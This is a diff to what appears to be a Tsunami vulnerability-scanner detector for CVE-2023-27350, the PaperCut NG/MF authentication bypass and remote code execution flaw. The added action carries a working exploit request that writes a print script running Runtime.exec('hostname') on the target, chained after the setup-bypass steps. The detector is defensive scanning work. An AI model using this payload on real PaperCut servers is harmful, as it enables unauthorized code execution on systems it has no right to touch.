@@ -16,7 +16,7 @@ info: {
 
 finding: {
   main_id: {
-    publisher: "GOOGLE"
+    publisher: "TSUNAMI_COMMUNITY"
     value: "CVE_2023_27350"
   }
   title: "Papercut NG/MF Authentication Bypass and RCE"
@@ -259,7 +259,7 @@ actions: {
 }
 
 actions: {
-  name: "execute_script"
+  name: "execute_script_callback"
   http_request: {
     method: POST
     uri: "/app"
@@ -288,18 +288,36 @@ actions: {
   callback_server: { action_type: CHECK }
 }
 
+# Action for when the callback server is disabled. This is all that's possible.
+
+actions: {
+  name: "execute_script_reflective"
+  http_request: {
+    method: POST
+    uri: "/app"
+    data: 
+      "service=direct/1/PrinterDetails/$PrinterDetailsScript.$Form&sp=S0&Form0=printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1&printerId=l1001&enablePrintScript=on&scriptBody=function printJobHook(inputs, actions) {}\r\njava.lang.Runtime.getRuntime().exec('hostname');&$Submit$1=Apply"
+    headers: [
+      { name: "Cookie" value: "JSESSIONID={{ COOKIE }};" },
+      { name: "Origin" value: "{{ T_NS_BASEURL }}" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Referer" value: "{{ T_NS_BASEURL }}app" },
+      { name: "Accept" value: "*/*" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      expect_all: {
+        conditions: { body {} contains: "Saved successfully" }
+      }
+    }
+  }
+}
+
 #############
 # WORKFLOWS #
 #############
-    #"complete_setup",
-    #"nav_settings_1",
-    #"update_settings_1",
-    #"nav_settings_2",
-    #"update_settings_2",
-    #"nav_printers",
-    #"nav_first_printer",
-    #"nav_scripting_tab",
-    #"execute_script",
 
 workflows: {
   condition: REQUIRES_CALLBACK_SERVER
@@ -313,8 +331,23 @@ workflows: {
     "nav_printers",
     "nav_first_printer",
     "nav_scripting_tab",
-    "execute_script",
+    "execute_script_callback",
     "sleep",
     "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  actions: [
+    "fingerprint_papercut",
+    "complete_setup",
+    "nav_settings_1",
+    "update_settings_1",
+    "nav_settings_2",
+    "update_settings_2",
+    "nav_printers",
+    "nav_first_printer",
+    "nav_scripting_tab",
+    "execute_script_reflective"
   ]
 }
